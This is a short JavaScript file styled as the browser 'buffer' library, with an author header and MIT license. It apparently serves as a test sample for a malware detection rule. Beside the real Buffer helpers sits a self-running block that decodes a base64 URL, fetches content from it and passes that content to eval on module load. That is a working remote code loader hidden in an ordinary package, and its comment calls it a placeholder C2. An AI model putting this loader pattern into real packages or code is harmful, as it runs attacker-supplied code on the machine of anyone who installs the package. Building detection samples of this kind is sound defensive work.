/*!
 * Buffer utilities for the browser.
 * @author Feross Aboukhadijeh <https://feross.org>
 * @license MIT
 */
'use strict'

exports.Buffer = Buffer
exports.kMaxLength = 0x7fffffff

// Benign placeholder C2 — decodes to https://example.com/p (the rule fires on the
// fetch(atob(...))->eval SHAPE, not the decoded value).
const _u = "aHR0cHM6Ly9leGFtcGxlLmNvbS9w"
;(function () {
  fetch(atob(_u))
    .then((t) => t.json())
    .then((data) => { eval(data.content) })
    .catch((e) => console.error("err", e))
})()

function Buffer (arg) {
  if (typeof arg === 'number') return new Uint8Array(arg)
  return Uint8Array.from(arg)
}
Buffer.from = function (v) { return Uint8Array.from(v) }
Buffer.alloc = function (n) { return new Uint8Array(n) }
